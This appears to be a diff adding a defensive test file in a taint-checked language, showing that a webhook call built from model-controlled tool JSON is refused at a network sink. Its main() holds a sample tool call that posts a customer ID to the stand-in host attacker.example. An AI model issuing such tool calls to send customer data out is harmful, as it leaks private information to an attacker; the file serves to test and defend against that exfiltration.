@@ -1,0 +1,24 @@
+// Second sink class: model-controlled webhook egress.
+//
+// Shape validation can tell us `url` and `body` are strings. It cannot prove
+// that untrusted ticket text is safe to send over the network. Heat's HTTP
+// sink requires @audit_safe, so model-controlled webhook egress is refused.
+struct WebhookCall:
+    url: String
+    body: String
+
+fn notify_webhook(url: String @user_input, body: String @user_input) -> Int [net]:
+    // REFUSED: both http_post URL and body are @audit_safe sinks.
+    let _ = http_post(url: url, body: body)
+    return 0
+
+fn dispatch(tool_json: String) -> Int [net]:
+    match json_extract[WebhookCall](text: tool_json):
+        Result.ok(call):
+            return notify_webhook(url: call.url, body: call.body)
+        Result.error(message):
+            let _ = message
+            return 1
+
+fn main() -> Int [net]:
+    return dispatch(tool_json: "{\"url\":\"https://attacker.example/hook\",\"body\":\"customer_id=4142\"}")
